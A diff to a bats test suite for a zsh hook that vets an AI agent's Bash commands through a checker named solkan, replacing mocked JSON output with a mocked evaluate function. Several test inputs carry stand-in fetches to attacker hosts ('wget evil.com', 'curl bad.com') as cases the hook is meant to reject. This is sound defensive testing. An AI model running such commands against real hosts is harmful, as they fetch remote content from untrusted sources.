@@ -114,10 +114,12 @@ setup() {
 # --- Mocked tests ---
 
 @test "allow with updatedInput when solkan allows and does not rewrite" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
@@ -126,11 +128,13 @@ setup() {
 }
 
 @test "ask permissionDecision with updatedInput when solkan refuses" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget" "curl")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
@@ -139,11 +143,13 @@ setup() {
 }
 
 @test "permissionDecisionReason lists rejected commands when solkan refuses" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget" "curl")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
@@ -151,11 +157,13 @@ setup() {
 }
 
 @test "no systemMessage when solkan rejects" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
@@ -163,10 +171,12 @@ setup() {
 }
 
 @test "hook logs to CLAUDE_HOOKS_LOG_DIR" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
@@ -174,10 +184,12 @@ setup() {
 }
 
 @test "preserves \xa0 as literal chars through full hook pipeline" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo \\xa0"}}'
   [[ "$status" -eq 0 ]]
@@ -190,11 +202,13 @@ setup() {
 }
 
 @test "repeat reject in session: ask with reason every time" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   local input='{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   bats_run_zsh "$SCRIPT" <<<"$input"
@@ -205,11 +219,13 @@ setup() {
 }
 
 @test "repeat multi-reject in session: ask listing all rejected every time" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget" "curl")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   local input='{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   bats_run_zsh "$SCRIPT" <<<"$input"
@@ -220,11 +236,13 @@ setup() {
 }
 
 @test "reject without session_id: ask with reason" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
@@ -233,11 +251,13 @@ setup() {
 }
 
 @test "reject records an approval pending entry with the tool use id and all rejected commands" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":["echo"],"rejected":["wget","curl"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget" "curl")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"echo ok; wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
@@ -248,11 +268,13 @@ setup() {
 }
 
 @test "reject shows a half moon next to a binary approved once" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command wget"
@@ -263,11 +285,13 @@ setup() {
 }
 
 @test "reject shows each binary with the moon of its own approval count" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["/usr/bin/grep","wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("/usr/bin/grep" "wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
@@ -279,10 +303,12 @@ setup() {
 }
 
 @test "allow records no approval pending entry" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
@@ -291,10 +317,12 @@ setup() {
 }
 
 @test "prefixes command with CLAUDE_IS_SUBAGENT export when agent_id present" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"},"agent_id":"sub-123"}'
   [[ "$status" -eq 0 ]]
@@ -302,11 +330,13 @@ setup() {
 }
 
 @test "prefixes command with CLAUDE_IS_SUBAGENT export on rejected path" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=reject
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=("wget")
     return 1
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"},"agent_id":"sub-123"}'
   [[ "$status" -eq 0 ]]
@@ -314,10 +344,12 @@ setup() {
 }
 
 @test "no CLAUDE_IS_SUBAGENT prefix when agent_id absent" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
@@ -325,10 +357,12 @@ setup() {
 }
 
 @test "rm rewritten: allow with rewrittenCommand as updatedInput" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["rm-guarded"],"rejected":[]},"rewrite":"rm-guarded foo.txt"}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND='rm-guarded foo.txt'
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm foo.txt"}}'
   [[ "$status" -eq 0 ]]
@@ -337,10 +371,12 @@ setup() {
 }
 
 @test "rmdir rewritten: allow with rewrittenCommand as updatedInput" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["rmdir-guarded"],"rejected":[]},"rewrite":"rmdir-guarded emptydir"}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND='rmdir-guarded emptydir'
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rmdir emptydir"}}'
   [[ "$status" -eq 0 ]]
@@ -349,10 +385,12 @@ setup() {
 }
 
 @test "compound rm rewritten: allow with rewrittenCommand as updatedInput" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["ls","rm-guarded"],"rejected":[]},"rewrite":"ls && rm-guarded foo.txt"}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND='ls && rm-guarded foo.txt'
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"ls && rm foo.txt"}}'
   [[ "$status" -eq 0 ]]
@@ -361,22 +399,26 @@ setup() {
 }
 
 @test "no rewrittenCommand from solkan: uses original inputCommand" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+  solkanEvaluate() {
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
 }
 
-@test "passes the cwd of the input JSON to the solkan wrapper" {
-  preToolUse-Bash-solkan() {
+@test "passes the cwd of the input JSON to solkanEvaluate" {
+  solkanEvaluate() {
     print -r -- "$2" > "$BATS_TMP_DIR/solkan-cwd.txt"
-    print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND="$1"
+    SOLKAN_REJECTED=()
   }
-  bats_mock preToolUse-Bash-solkan
+  bats_mock solkanEvaluate
 
   bats_run_zsh "$SCRIPT" <<<'{"cwd":"/some/worktree","tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
